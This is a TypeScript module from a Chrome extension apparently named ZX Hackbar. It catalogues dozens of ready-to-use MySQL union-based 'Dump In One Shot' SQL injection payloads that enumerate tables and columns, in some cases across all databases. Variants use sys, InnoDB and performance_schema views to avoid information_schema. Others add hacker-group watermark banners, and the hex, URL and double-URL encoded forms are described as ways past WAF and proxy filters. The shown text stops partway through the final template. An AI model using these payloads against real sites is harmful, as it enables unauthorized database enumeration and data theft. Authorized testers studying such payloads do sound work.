/**
 * ZX HACKBAR — Security Testing & HTTP Inspection Chrome Extension
 * 
 * @module UnionBasedDiosMysql
 * @author Zone Xploiter / ZXMarchia
 * @license MIT
 * @description Comprehensive Union-Based MySQL Dump In One Shot (DIOS) template collection.
 */

import { BuilderSubcategory, BuilderTemplate } from '../../types';

export const DIOS_MYSQL_GROUPS = [
  'Standard (Information Schema)',
  'Non-Information Schema / Bypass',
  'Variable Based (@:=)',
  'Classic & Signatures (Author / Popular Payloads)',
  'Hex Encoded (SQL, URL & HTML Hex)'
] as const;

export type DiosMysqlGroup = typeof DIOS_MYSQL_GROUPS[number];

// ============================================================================
// 1. STANDARD (INFORMATION SCHEMA) — 10 Templates
// ============================================================================
const standardDiosTemplates: BuilderTemplate[] = [
  {
    id: 'dios-mysql-std-group-concat',
    name: 'Standard group_concat() DIOS',
    group: 'Standard (Information Schema)',
    tags: ['standard', 'group_concat', 'info_schema'],
    description: 'Ekstraksi skema dan tabel standar menggunakan group_concat()',
    content: "(SELECT(@)FROM(SELECT(@:=0x00),(SELECT(0)FROM(information_schema.columns)WHERE(table_schema=database())AND(@)AND(@:=CONCAT(@,0x0a,table_name,0x3a,column_name))))x)"
  },
  {
    id: 'dios-mysql-std-concat-ws',
    name: 'Standard concat_ws() DIOS',
    group: 'Standard (Information Schema)',
    tags: ['standard', 'concat_ws', 'separator'],
    description: 'DIOS standar dengan format pemisah baris concat_ws()',
    content: "(SELECT(@x)FROM(SELECT(@x:=0x00),(SELECT(0)FROM(information_schema.columns)WHERE(table_schema=database())AND(@x)AND(@x:=concat_ws(0x0a,@x,concat_ws(0x3a,table_name,column_name)))))x)"
  },
  {
    id: 'dios-mysql-std-multitable',
    name: 'Multi-Schema / All DB DIOS',
    group: 'Standard (Information Schema)',
    tags: ['standard', 'all-db', 'dump'],
    description: 'Dump seluruh database, tabel, dan kolom sekaligus',
    content: "(SELECT(@a)FROM(SELECT(@a:=0x00),(SELECT(0)FROM(information_schema.columns)WHERE(@a)AND(@a:=concat(@a,0x0a,table_schema,0x2e,table_name,0x3a,column_name))))a)"
  },
  {
    id: 'dios-mysql-std-make-set',
    name: 'MAKE_SET Delimited DIOS',
    group: 'Standard (Information Schema)',
    tags: ['standard', 'make_set', 'no-concat'],
    description: 'Ekstraksi kolom tanpa menggunakan fungsi CONCAT() via MAKE_SET()',
    content: "(SELECT(@m)FROM(SELECT(@m:=0x00),(SELECT(0)FROM(information_schema.columns)WHERE(table_schema=database())AND(@m)AND(@m:=make_set(511,@m,0x0a,table_name,0x3a,column_name))))m)"
  },
  {
    id: 'dios-mysql-std-export-set',
    name: 'EXPORT_SET Hex Separator DIOS',
    group: 'Standard (Information Schema)',
    tags: ['standard', 'export_set', 'no-concat'],
    description: 'Ekstraksi tabel dan kolom menggunakan EXPORT_SET() dengan pemisah heksadesimal',
    content: "(SELECT(@e)FROM(SELECT(@e:=0x00),(SELECT(0)FROM(information_schema.columns)WHERE(table_schema=database())AND(@e)AND(@e:=concat(@e,0x0a,export_set(5,table_name,column_name,0x3a,2)))))e)"
  },
  {
    id: 'dios-mysql-std-subquery-limit',
    name: 'Subquery GROUP_CONCAT DIOS',
    group: 'Standard (Information Schema)',
    tags: ['standard', 'group_concat', 'clean'],
    description: 'Ekstraksi seluruh tabel dan kolom database saat ini via subquery bersih',
    content: "(SELECT group_concat(table_name,0x3a,column_name SEPARATOR 0x0a) FROM information_schema.columns WHERE table_schema=database())"
  },
  {
    id: 'dios-mysql-std-procedural',
    name: 'Clean Delimiter Procedural DIOS',
    group: 'Standard (Information Schema)',
    tags: ['standard', 'procedural', 'clean'],
    description: 'Ekstraksi skema dan kolom dengan format titik Table.Column',
    content: "(SELECT(@p)FROM(SELECT(@p:=0x00),(SELECT(0)FROM(information_schema.columns)WHERE(table_schema=database())AND(@p:=concat(@p,0x0a,table_name,0x2e,column_name))))p)"
  },
  {
    id: 'dios-mysql-std-table-group',
    name: 'Grouped By Table Name DIOS',
    group: 'Standard (Information Schema)',
    tags: ['standard', 'grouped', 'table-view'],
    description: 'Menampilkan nama tabel dalam tanda kurung siku [Table] diikuti daftar kolom koma',
    content: "(SELECT group_concat(concat(0x0a,0x5b,table_name,0x5d,0x20,cols) SEPARATOR 0x0a) FROM (SELECT table_name, group_concat(column_name SEPARATOR 0x2c) cols FROM information_schema.columns WHERE table_schema=database() GROUP BY table_name) t)"
  },
  {
    id: 'dios-mysql-std-db-table-col',
    name: 'Full DB.Table.Column Triplet DIOS',
    group: 'Standard (Information Schema)',
    tags: ['standard', 'triplet', 'full-path'],
    description: 'Ekstraksi lengkap berformat Database.Table.Column per baris',
    content: "(SELECT(@f)FROM(SELECT(@f:=0x00),(SELECT(0)FROM(information_schema.columns)WHERE(table_schema=database())AND(@f)AND(@f:=concat(@f,0x0a,table_schema,0x2e,table_name,0x2e,column_name))))f)"
  },
  {
    id: 'dios-mysql-std-distinct-columns',
    name: 'Distinct Unique Schema Columns DIOS',
    group: 'Standard (Information Schema)',
    tags: ['standard', 'distinct', 'unique'],
    description: 'Mencegah duplikasi data kolom pada tabel berpartisi atau bertipe federated',
    content: "(SELECT(@u)FROM(SELECT(@u:=0x00),(SELECT(0)FROM(SELECT DISTINCT table_name,column_name FROM information_schema.columns WHERE table_schema=database())c WHERE(@u)AND(@u:=concat(@u,0x0a,table_name,0x3a,column_name))))u)"
  }
];

// ============================================================================
// 2. NON-INFORMATION SCHEMA / BYPASS — 15 Templates
// ============================================================================
const nonInfoSchemaDiosTemplates: BuilderTemplate[] = [
  {
    id: 'dios-mysql-noninfo-sys-schema',
    name: 'sys.schema_table_statistics DIOS',
    group: 'Non-Information Schema',
    tags: ['non-info', 'sys', 'schema_stats', 'bypass'],
    description: 'Bypass proteksi information_schema menggunakan tabel sys',
    content: "(SELECT(@x)FROM(SELECT(@x:=0x00),(SELECT(0)FROM(sys.schema_table_statistics)WHERE(table_schema=database())AND(@x)AND(@x:=concat(@x,0x0a,table_name))))x)"
  },
  {
    id: 'dios-mysql-noninfo-innodb-stats',
    name: 'mysql.innodb_table_stats DIOS',
    group: 'Non-Information Schema',
    tags: ['non-info', 'innodb', 'stats', 'bypass'],
    description: 'Ekstraksi nama tabel via metadata internal InnoDB (MySQL >= 5.6)',
    content: "(SELECT(@a)FROM(SELECT(@a:=0x00),(SELECT(0)FROM(mysql.innodb_table_stats)WHERE(database_name=database())AND(@a)AND(@a:=concat(@a,0x0a,table_name))))a)"
  },
  {
    id: 'dios-mysql-noninfo-innodb-index',
    name: 'mysql.innodb_index_stats DIOS',
    group: 'Non-Information Schema',
    tags: ['non-info', 'innodb', 'index_stats'],
    description: 'Dump skema dan kolom via InnoDB Index Stats',
    content: "(SELECT(@i)FROM(SELECT(@i:=0x00),(SELECT(0)FROM(mysql.innodb_index_stats)WHERE(database_name=database())AND(@i)AND(@i:=concat(@i,0x0a,table_name,0x3a,index_name))))i)"
  },
  {
    id: 'dios-mysql-noninfo-sys-auto-inc',
    name: 'sys.schema_auto_increment_columns DIOS',
    group: 'Non-Information Schema',
    tags: ['non-info', 'sys', 'auto_increment'],
    description: 'Bypass Information Schema via auto increment columns metadata',
    content: "(SELECT(@s)FROM(SELECT(@s:=0x00),(SELECT(0)FROM(sys.schema_auto_increment_columns)WHERE(table_schema=database())AND(@s)AND(@s:=concat(@s,0x0a,table_name,0x3a,column_name))))s)"
  },
  {
    id: 'dios-mysql-noninfo-sys-table-buffer',
    name: 'sys.schema_table_statistics_with_buffer DIOS',
    group: 'Non-Information Schema',
    tags: ['non-info', 'sys', 'buffer-stats'],
    description: 'Ekstraksi nama tabel melalui schema table buffer statistics pada MySQL 5.7/8.0',
    content: "(SELECT(@b)FROM(SELECT(@b:=0x00),(SELECT(0)FROM(sys.schema_table_statistics_with_buffer)WHERE(table_schema=database())AND(@b)AND(@b:=concat(@b,0x0a,table_name))))b)"
  },
  {
    id: 'dios-mysql-noninfo-sys-object-overview',
    name: 'sys.schema_object_overview DIOS',
    group: 'Non-Information Schema',
    tags: ['non-info', 'sys', 'object-overview'],
    description: 'Dump seluruh objek tabel, view, dan rutin database tanpa information_schema',
    content: "(SELECT(@o)FROM(SELECT(@o:=0x00),(SELECT(0)FROM(sys.schema_object_overview)WHERE(db=database())AND(@o)AND(@o:=concat(@o,0x0a,type,0x3a,name))))o)"
  },
  {
    id: 'dios-mysql-noninfo-perf-objects',
    name: 'performance_schema.objects_summary DIOS',
    group: 'Non-Information Schema',
    tags: ['non-info', 'perf_schema', 'objects_summary'],
    description: 'Ekstraksi nama tabel via performance_schema objects_summary_global_by_type',
    content: "(SELECT(@p)FROM(SELECT(@p:=0x00),(SELECT(0)FROM(performance_schema.objects_summary_global_by_type)WHERE(object_schema=database())AND(@p)AND(@p:=concat(@p,0x0a,object_name))))p)"
  },
  {
    id: 'dios-mysql-noninfo-sys-indexes',
    name: 'sys.schema_index_statistics DIOS',
    group: 'Non-Information Schema',
    tags: ['non-info', 'sys', 'index_stats'],
    description: 'Dump tabel dan indeks kolom via sys.schema_index_statistics',
    content: "(SELECT(@x)FROM(SELECT(@x:=0x00),(SELECT(0)FROM(sys.schema_index_statistics)WHERE(table_schema=database())AND(@x)AND(@x:=concat(@x,0x0a,table_name,0x3a,index_name))))x)"
  },
  {
    id: 'dios-mysql-noninfo-mysql-tables-priv',
    name: 'mysql.tables_priv Metadata DIOS',
    group: 'Non-Information Schema',
    tags: ['non-info', 'mysql-system', 'tables_priv'],
    description: 'Ekstraksi nama tabel dari tabel hak akses internal mysql.tables_priv',
    content: "(SELECT(@t)FROM(SELECT(@t:=0x00),(SELECT(0)FROM(mysql.tables_priv)WHERE(db=database())AND(@t)AND(@t:=concat(@t,0x0a,table_name,0x3a,column_priv))))t)"
  },
  {
    id: 'dios-mysql-noninfo-innodb-ft-deleted',
    name: 'mysql.innodb_table_stats (All DB) DIOS',
    group: 'Non-Information Schema',
    tags: ['non-info', 'innodb', 'all-db'],
    description: 'Dump seluruh database dan tabel di server via metadata InnoDB global',
    content: "(SELECT(@f)FROM(SELECT(@f:=0x00),(SELECT(0)FROM(mysql.innodb_table_stats)WHERE(@f)AND(@f:=concat(@f,0x0a,database_name,0x2e,table_name))))f)"
  },
  {
    id: 'dios-mysql-noninfo-sys-x-stats',
    name: 'sys.x$schema_table_statistics DIOS',
    group: 'Non-Information Schema',
    tags: ['non-info', 'sys-raw', 'x-schema'],
    description: 'Bypass WAF menggunakan view mentah x$schema_table_statistics',
    content: "(SELECT(@s)FROM(SELECT(@s:=0x00),(SELECT(0)FROM(sys.x$schema_table_statistics)WHERE(table_schema=database())AND(@s)AND(@s:=concat(@s,0x0a,table_name))))s)"
  },
  {
    id: 'dios-mysql-noninfo-sys-x-auto-inc',
    name: 'sys.x$schema_auto_increment DIOS',
    group: 'Non-Information Schema',
    tags: ['non-info', 'sys-raw', 'x-auto-inc'],
    description: 'Ekstraksi kolom auto-increment via tabel mentah sys x$',
    content: "(SELECT(@x)FROM(SELECT(@x:=0x00),(SELECT(0)FROM(sys.x$schema_auto_increment_columns)WHERE(table_schema=database())AND(@x)AND(@x:=concat(@x,0x0a,table_name,0x3a,column_name))))x)"
  },
  {
    id: 'dios-mysql-noninfo-sys-lock-waits',
    name: 'sys.schema_table_lock_waits DIOS',
    group: 'Non-Information Schema',
    tags: ['non-info', 'sys', 'lock_waits'],
    description: 'Ekstraksi nama tabel ter-kunci atau aktif via sys.schema_table_lock_waits',
    content: "(SELECT(@l)FROM(SELECT(@l:=0x00),(SELECT(0)FROM(sys.schema_table_lock_waits)WHERE(@l)AND(@l:=concat(@l,0x0a,object_schema,0x2e,object_table))))l)"
  },
  {
    id: 'dios-mysql-noninfo-innodb-all-index',
    name: 'mysql.innodb_index_stats (All DB) DIOS',
    group: 'Non-Information Schema',
    tags: ['non-info', 'innodb', 'all-indexes'],
    description: 'Dump seluruh indeks di semua skema database via InnoDB Index Stats',
    content: "(SELECT(@d)FROM(SELECT(@d:=0x00),(SELECT(0)FROM(mysql.innodb_index_stats)WHERE(@d)AND(@d:=concat(@d,0x0a,database_name,0x2e,table_name,0x3a,index_name))))d)"
  },
  {
    id: 'dios-mysql-noninfo-memory-threads',
    name: 'sys.x$memory_by_thread DIOS',
    group: 'Non-Information Schema',
    tags: ['non-info', 'sys', 'memory-thread'],
    description: 'Ekstraksi aktivitas thread dan koneksi user database saat ini',
    content: "(SELECT(@m)FROM(SELECT(@m:=0x00),(SELECT(0)FROM(sys.x$memory_by_thread_by_current_bytes)WHERE(@m)AND(@m:=concat(@m,0x0a,thread_id,0x3a,user))))m)"
  }
];

// ============================================================================
// 3. VARIABLE BASED (@:=) — 10 Templates
// ============================================================================
const variableBasedDiosTemplates: BuilderTemplate[] = [
  {
    id: 'dios-mysql-var-session',
    name: 'Session Variable Single-Shot DIOS',
    group: 'Variable Based (@:=)',
    tags: ['variable', 'session', 'single-shot'],
    description: 'Penetapan variabel sesi MySQL (@) untuk dump skema per baris',
    content: "(SELECT(@)FROM(SELECT(@:=0x00),(SELECT(0)FROM(information_schema.columns)WHERE(table_schema=database())AND(@)AND(@:=concat(@,0x0a,table_name,0x3a,column_name))))x)"
  },
  {
    id: 'dios-mysql-var-unquoted',
    name: 'Unquoted Variable Delimited DIOS',
    group: 'Variable Based (@:=)',
    tags: ['variable', 'unquoted', '0x-hex'],
    description: 'Seluruh konstanta teks dan pemisah ditulis murni dalam 0x heksadesimal',
    content: "(SELECT(@x)FROM(SELECT(@x:=0x00),(SELECT(0)FROM(information_schema.columns)WHERE(table_schema=database())AND(@x)AND(@x:=concat(@x,0x0a,table_name,0x3a,column_name))))x)"
  },
  {
    id: 'dios-mysql-var-concat-ws',
    name: 'CONCAT_WS Nested Variable DIOS',
    group: 'Variable Based (@:=)',
    tags: ['variable', 'concat_ws', 'nested'],
    description: 'Inisialisasi variabel bertingkat dengan concat_ws()',
    content: "(SELECT(@v)FROM(SELECT(@v:=0x00),(SELECT(0)FROM(information_schema.columns)WHERE(table_schema=database())AND(@v)AND(@v:=concat_ws(0x0a,@v,concat_ws(0x3a,table_name,column_name)))))v)"
  },
  {
    id: 'dios-mysql-var-dual-collector',
    name: 'Dual Variable Table & Column DIOS',
    group: 'Variable Based (@:=)',
    tags: ['variable', 'dual-var', 'collector'],
    description: 'Dua variabel independen (@t untuk tabel, @c untuk kolom) diakumulasikan bersamaan',
    content: "(SELECT(@t)FROM(SELECT(@t:=0x00),(@c:=0x00),(SELECT(0)FROM(information_schema.columns)WHERE(table_schema=database())AND(@t:=concat(@t,0x0a,table_name,0x3a,column_name))))t)"
  },
  {
    id: 'dios-mysql-var-count-enumerator',
    name: 'Auto-Numbered Row Enumeration DIOS',
    group: 'Variable Based (@:=)',
    tags: ['variable', 'row-counter', 'numbered'],
    description: 'Menambahkan nomor urut otomatis (1. table:col, 2. ...) menggunakan counter @i:=@i+1',
    content: "(SELECT(@r)FROM(SELECT(@r:=0x00),(@i:=0),(SELECT(0)FROM(information_schema.columns)WHERE(table_schema=database())AND(@r)AND(@r:=concat(@r,0x0a,(@i:=@i+1),0x2e20,table_name,0x3a,column_name))))r)"
  },
  {
    id: 'dios-mysql-var-inline-assign',
    name: 'Minimal Inline := Assign DIOS',
    group: 'Variable Based (@:=)',
    tags: ['variable', 'inline', 'minimal'],
    description: 'Sintaks penugasan variabel paling ringkas tanpa kondisi redundan',
    content: "(SELECT(@x)FROM(SELECT(@x:=0x00),(SELECT(0)FROM(information_schema.columns)WHERE(table_schema=database())AND(@x:=concat(@x,0x0a,table_name,0x3a,column_name))))x)"
  },
  {
    id: 'dios-mysql-var-bracket-format',
    name: 'Bracket-Formatted [Table]->Column DIOS',
    group: 'Variable Based (@:=)',
    tags: ['variable', 'bracket-format', 'pretty'],
    description: 'Format visual [Table]->Column per baris untuk kemudahan membaca dump',
    content: "(SELECT(@b)FROM(SELECT(@b:=0x00),(SELECT(0)FROM(information_schema.columns)WHERE(table_schema=database())AND(@b)AND(@b:=concat(@b,0x0a,0x5b,table_name,0x5d2d3e,column_name))))b)"
  },
  {
    id: 'dios-mysql-var-compact-pipe',
    name: 'Pipe Separator Table|Column DIOS',
    group: 'Variable Based (@:=)',
    tags: ['variable', 'pipe-separated', 'unix-style'],
    description: 'Pemisah baris pipe 0x7c bergaya Unix Table|Column',
    content: "(SELECT(@p)FROM(SELECT(@p:=0x00),(SELECT(0)FROM(information_schema.columns)WHERE(table_schema=database())AND(@p)AND(@p:=concat(@p,0x0a,table_name,0x7c,column_name))))p)"
  },
  {
    id: 'dios-mysql-var-csv-flow',
    name: 'CSV Format Table,Column DIOS',
    group: 'Variable Based (@:=)',
    tags: ['variable', 'csv-format', 'comma'],
    description: 'Pemisah koma CSV Table,Column yang siap di-copy ke spreadsheet',
    content: "(SELECT(@c)FROM(SELECT(@c:=0x00),(SELECT(0)FROM(information_schema.columns)WHERE(table_schema=database())AND(@c)AND(@c:=concat(@c,0x0a,table_name,0x2c,column_name))))c)"
  },
  {
    id: 'dios-mysql-var-no-where',
    name: 'All Databases Variable Enumeration DIOS',
    group: 'Variable Based (@:=)',
    tags: ['variable', 'all-databases', 'global'],
    description: 'Dump seluruh isi server tanpa klausa WHERE table_schema=database()',
    content: "(SELECT(@a)FROM(SELECT(@a:=0x00),(SELECT(0)FROM(information_schema.columns)WHERE(@a)AND(@a:=concat(@a,0x0a,table_schema,0x2e,table_name,0x3a,column_name))))a)"
  }
];

// ============================================================================
// 4. CLASSIC & SIGNATURES (AUTHOR / POPULAR PAYLOADS) — 15 Templates
// ============================================================================
const classicSignaturesDiosTemplates: BuilderTemplate[] = [
  // --- ZXMarchia & ZX Hackbar Signatures ---
  {
    id: 'dios-mysql-sig-zxmarchia-neon',
    name: 'Injected by ZXMarchia - ZX Hackbar (Neon Green Glow)',
    group: 'Classic & Signatures',
    tags: ['signature', 'zxmarchia', 'neon-green', 'watermark'],
    description: 'Header tebal menyala hijau neon <font color=#A3FF70><b>[ Injected by ZXMarchia - ZX Hackbar ]</b></font><br>',
    content: "(SELECT(@ntt)FROM(SELECT(@ntt:=0x3c666f6e7420636f6c6f723d234133464637303e3c623e5b20496e6a6563746564206279205a584d617263686961202d205a58204861636b626172205d3c2f623e3c2f666f6e743e3c62723e),(SELECT(0)FROM(information_schema.columns)WHERE(table_schema=database())AND(@ntt)AND(@ntt:=concat(@ntt,0x0a,table_name,0x3a,column_name))))ntt)"
  },
  {
    id: 'dios-mysql-sig-zxmarchia-red',
    name: 'Injected by ZXMarchia - ZX Hackbar (Neon Red Fire)',
    group: 'Classic & Signatures',
    tags: ['signature', 'zxmarchia', 'neon-red', 'watermark'],
    description: 'Header tebal merah menyala <font color=#FF3344><b>[ Injected by ZXMarchia - ZX Hackbar ]</b></font><br>',
    content: "(SELECT(@ntt)FROM(SELECT(@ntt:=0x3c666f6e7420636f6c6f723d234646333334343e3c623e5b20496e6a6563746564206279205a584d617263686961202d205a58204861636b626172205d3c2f623e3c2f666f6e743e3c62723e),(SELECT(0)FROM(information_schema.columns)WHERE(table_schema=database())AND(@ntt)AND(@ntt:=concat(@ntt,0x0a,table_name,0x3a,column_name))))ntt)"
  },
  {
    id: 'dios-mysql-sig-zxmarchia-cyan',
    name: 'Injected by ZXMarchia - ZX Hackbar (Cyber Cyan)',
    group: 'Classic & Signatures',
    tags: ['signature', 'zxmarchia', 'cyber-cyan', 'watermark'],
    description: 'Header tebal biru elektrik <font color=#00FFFF><b>[ Injected by ZXMarchia - ZX Hackbar ]</b></font><br>',
    content: "(SELECT(@ntt)FROM(SELECT(@ntt:=0x3c666f6e7420636f6c6f723d233030464646463e3c623e5b20496e6a6563746564206279205a584d617263686961202d205a58204861636b626172205d3c2f623e3c2f666f6e743e3c62723e),(SELECT(0)FROM(information_schema.columns)WHERE(table_schema=database())AND(@ntt)AND(@ntt:=concat(@ntt,0x0a,table_name,0x3a,column_name))))ntt)"
  },
  {
    id: 'dios-mysql-sig-zxmarchia-ascii',
    name: 'Injected by ZXMarchia - ZX Hackbar (ASCII Frame)',
    group: 'Classic & Signatures',
    tags: ['signature', 'zxmarchia', 'ascii-frame', 'watermark'],
    description: 'Header border simbol ASCII: === [ Injected by ZXMarchia - ZX Hackbar ] ===',
    content: "(SELECT(@ntt)FROM(SELECT(@ntt:=0x0a3d3d3d205b20496e6a6563746564206279205a584d617263686961202d205a58204861636b626172205d203d3d3d0a),(SELECT(0)FROM(information_schema.columns)WHERE(table_schema=database())AND(@ntt)AND(@ntt:=concat(@ntt,0x0a,table_name,0x3a,column_name))))ntt)"
  },
  {
    id: 'dios-mysql-sig-zxmarchia-noninfo',
    name: 'ZXMarchia Non-Information Schema DIOS',
    group: 'Classic & Signatures',
    tags: ['signature', 'zxmarchia', 'non-info', 'sys-bypass'],
    description: 'Header ZXMarchia dengan bypass tabel sistem sys.schema_auto_increment_columns',
    content: "(SELECT(@n)FROM(SELECT(@n:=0x3c666f6e7420636f6c6f723d234133464637303e3c623e5b20496e6a6563746564206279205a584d617263686961202d205a58204861636b626172205d3c2f623e3c2f666f6e743e3c62723e),(SELECT(0)FROM(sys.schema_auto_increment_columns)WHERE(table_schema=database())AND(@n)AND(@n:=concat(@n,0x0a,table_name,0x3a,column_name))))n)"
  },

  // --- Classic Community Signatures ---
  {
    id: 'dios-mysql-classic-ozsec',
    name: 'Oz-Sec Signature DIOS',
    group: 'Classic & Signatures',
    tags: ['classic', 'oz-sec', 'signature'],
    description: 'Format kueri dump legendaris Oz-Sec Team',
    content: "(SELECT(@o)FROM(SELECT(@o:=0x2d2d5b204f7a2d536563205465616d205d2d2d0a),(SELECT(0)FROM(information_schema.columns)WHERE(table_schema=database())AND(@o)AND(@o:=concat(@o,0x0a,table_name,0x3a,column_name))))o)"
  },
  {
    id: 'dios-mysql-classic-kamtiez',
    name: 'KaMtiEz v2 Signature DIOS',
    group: 'Classic & Signatures',
    tags: ['classic', 'kamtiez', 'signature'],
    description: 'Kueri dump khas KaMtiEz dengan pemisah format rapi',
    content: "(SELECT(@k)FROM(SELECT(@k:=0x0a2d2d3d204b614d7469457a2044494f53203d2d2d0a),(SELECT(0)FROM(information_schema.columns)WHERE(table_schema=database())AND(@k)AND(@k:=concat(@k,0x0a,table_name,0x3a,column_name))))k)"
  },
  {
    id: 'dios-mysql-classic-madblood',
    name: 'MadBlood Non-Space DIOS',
    group: 'Classic & Signatures',
    tags: ['classic', 'madblood', 'non-space'],
    description: 'Kueri ekstraksi tanpa karakter spasi khas MadBlood',
    content: "(SELECT(@mb)FROM(SELECT(@mb:=0x00),(SELECT(0)FROM(information_schema.columns)WHERE(table_schema=database())AND(@mb)AND(@mb:=concat(@mb,0x0a,table_name,0x3a,column_name))))mb)"
  },
  {
    id: 'dios-mysql-classic-zen',
    name: 'Zen Signature DIOS',
    group: 'Classic & Signatures',
    tags: ['classic', 'zen', 'signature'],
    description: 'Format injeksi Zen DIOS dengan watermarking header',
    content: "(SELECT(@z)FROM(SELECT(@z:=0x0a5b205a656e2044494f53205d0a),(SELECT(0)FROM(information_schema.columns)WHERE(table_schema=database())AND(@z)AND(@z:=concat(@z,0x0a,table_name,0x3a,column_name))))z)"
  },
  {
    id: 'dios-mysql-classic-cwm',
    name: 'C-W-M Signature DIOS',
    group: 'Classic & Signatures',
    tags: ['classic', 'cwm', 'signature'],
    description: 'Community Weaponized Method (C-W-M) multi-column DIOS',
    content: "(SELECT(@cwm)FROM(SELECT(@cwm:=0x0a5b20432d572d4d2044494f53205d0a),(SELECT(0)FROM(information_schema.columns)WHERE(table_schema=database())AND(@cwm)AND(@cwm:=concat(@cwm,0x0a,table_name,0x3a,column_name))))cwm)"
  },
  {
    id: 'dios-mysql-classic-drcrash',
    name: 'Dr.Crash Multi-Dump DIOS',
    group: 'Classic & Signatures',
    tags: ['classic', 'drcrash', 'multi-dump'],
    description: 'Format dump multi-skema Dr.Crash',
    content: "(SELECT(@dc)FROM(SELECT(@dc:=0x0a2d2d5b2044722e4372617368205d2d2d0a),(SELECT(0)FROM(information_schema.columns)WHERE(table_schema=database())AND(@dc)AND(@dc:=concat(@dc,0x0a,table_name,0x3a,column_name))))dc)"
  },
  {
    id: 'dios-mysql-classic-gass',
    name: 'GASS Team Signature DIOS',
    group: 'Classic & Signatures',
    tags: ['classic', 'gass', 'signature'],
    description: 'Kueri dump signature GASS Team',
    content: "(SELECT(@g)FROM(SELECT(@g:=0x0a5b2047415353205465616d205d0a),(SELECT(0)FROM(information_schema.columns)WHERE(table_schema=database())AND(@g)AND(@g:=concat(@g,0x0a,table_name,0x3a,column_name))))g)"
  },
  {
    id: 'dios-mysql-classic-indoxploit',
    name: 'IndoXploit Signature DIOS',
    group: 'Classic & Signatures',
    tags: ['classic', 'indoxploit', 'signature'],
    description: 'Format signature IndoXploit community dump',
    content: "(SELECT(@ix)FROM(SELECT(@ix:=0x0a2d2d5b20496e646f58706c6f6974205d2d2d0a),(SELECT(0)FROM(information_schema.columns)WHERE(table_schema=database())AND(@ix)AND(@ix:=concat(@ix,0x0a,table_name,0x3a,column_name))))ix)"
  },
  {
    id: 'dios-mysql-classic-zonexploiter',
    name: 'Zone Xploiter Cyber Frame DIOS',
    group: 'Classic & Signatures',
    tags: ['classic', 'zonexploiter', 'cyber-frame'],
    description: 'Header cyber frame Zone Xploiter [+- Zone Xploiter -+]',
    content: "(SELECT(@zx)FROM(SELECT(@zx:=0x0a5b2b2d205a6f6e652058706c6f69746572202d2b5d0a),(SELECT(0)FROM(information_schema.columns)WHERE(table_schema=database())AND(@zx)AND(@zx:=concat(@zx,0x0a,table_name,0x3a,column_name))))zx)"
  },
  {
    id: 'dios-mysql-classic-custom-author',
    name: 'Custom Author Watermark DIOS (Configurable)',
    group: 'Classic & Signatures',
    tags: ['classic', 'custom-author', 'interactive'],
    description: 'DIOS dengan parameter author dinamis yang dapat dikustomisasi',
    content: "(SELECT(@usr)FROM(SELECT(@usr:=0x3c666f6e7420636f6c6f723d234133464637303e3c623e5b20496e6a6563746564206279204e747442656c6c202d2058656f6f204861636b626172205d3c2f623e3c2f666f6e743e3c62723e),(SELECT(0)FROM(information_schema.columns)WHERE(table_schema=database())AND(@usr)AND(@usr:=concat(@usr,0x0a,table_name,0x3a,column_name))))usr)"
  }
];

// ============================================================================
// 5. HEX ENCODED (SQL, URL & HTML HEX) — 10 Templates
// ============================================================================
const hexEncodedDiosTemplates: BuilderTemplate[] = [
  {
    id: 'dios-mysql-hex-sql-full',
    name: 'Full 0x Hex Delimited DIOS',
    group: 'Hex Encoded (SQL, URL & HTML Hex)',
    tags: ['hex', 'sql-hex', 'unquoted'],
    description: 'Seluruh pemisah (0x3a, 0x0a) ditulis dalam heksadesimal murni tanpa tanda petik',
    content: "(SELECT(@h)FROM(SELECT(@h:=0x00),(SELECT(0)FROM(information_schema.columns)WHERE(table_schema=database())AND(@h)AND(@h:=concat(@h,0x0a,table_name,0x3a,column_name))))h)"
  },
  {
    id: 'dios-mysql-hex-char-concat-ws',
    name: 'CONCAT_WS with CHAR(0x3a) Hex DIOS',
    group: 'Hex Encoded (SQL, URL & HTML Hex)',
    tags: ['hex', 'char-hex', 'concat_ws'],
    description: 'Pemisah baris dan kolom disusun menggunakan fungsi CHAR(0x3a) dan CHAR(0x0a)',
    content: "(SELECT(@c)FROM(SELECT(@c:=0x00),(SELECT(0)FROM(information_schema.columns)WHERE(table_schema=database())AND(@c)AND(@c:=concat_ws(CHAR(0x0a),@c,concat_ws(CHAR(0x3a),table_name,column_name)))))c)"
  },
  {
    id: 'dios-mysql-hex-url-standard',
    name: 'URL Hex Encoded (%xx) Standard DIOS',
    group: 'Hex Encoded (SQL, URL & HTML Hex)',
    tags: ['hex', 'url-hex', 'percent-encoded'],
    description: 'Kueri standard DIOS di-encode penuh ke bentuk percent-hex URL %xx',
    content: "%28SELECT%28%40%29FROM%28SELECT%28%40%3A%3D0x00%29%2C%28SELECT%280%29FROM%28information_schema.columns%29WHERE%28table_schema%3Ddatabase%28%29%29AND%28%40%29AND%28%40%3A%3DCONCAT%28%40%2C0x0a%2Ctable_name%2C0x3a%2Ccolumn_name%29%29%29%29x%29"
  },
  {
    id: 'dios-mysql-hex-url-concat-ws',
    name: 'URL Hex Encoded (%xx) concat_ws DIOS',
    group: 'Hex Encoded (SQL, URL & HTML Hex)',
    tags: ['hex', 'url-hex', 'concat_ws'],
    description: 'Varian concat_ws() dalam format percent-hex URL %xx',
    content: "%28SELECT%28%40x%29FROM%28SELECT%28%40x%3A%3D0x00%29%2C%28SELECT%280%29FROM%28information_schema.columns%29WHERE%28table_schema%3Ddatabase%28%29%29AND%28%40x%29AND%28%40x%3A%3Dconcat_ws%280x0a%2C%40x%2Cconcat_ws%280x3a%2Ctable_name%2Ccolumn_name%29%29%29%29%29x%29"
  },
  {
    id: 'dios-mysql-hex-double-url',
    name: 'Double URL Hex (%25xx) Standard DIOS',
    group: 'Hex Encoded (SQL, URL & HTML Hex)',
    tags: ['hex', 'double-hex', 'gateway-bypass'],
    description: 'Double percent-hex encoded string untuk melewati filter reverse proxy multi-tier',
    content: "%2528SELECT%2528%2540%2529FROM%2528SELECT%2528%2540%253A%253D0x00%2529%252C%2528SELECT%25280%2529FROM%2528information_schema.columns%2529WHERE%2528table_schema%253Ddatabase%2528%2529%2529AND%2528%2540%2529AND%2528%2540%253A%253DCONCAT%2528%2540%252C0x0a%252Ctable_name%252C0x3a%252Ccolumn_name%2529%2529%2529%2529x%2529"
  },
  {
    id: 'dios-mysql-hex-html-numeric',
    name: 'HTML Hex Entity (&#x..;) Encoded DIOS',
    group: 'Hex Encoded (SQL, URL & HTML Hex)',
    tags: ['hex', 'html-hex', 'entity-decode'],
    description: 'Sintaks heksadesimal HTML entity untuk bypass filter WAF layer aplikasi',
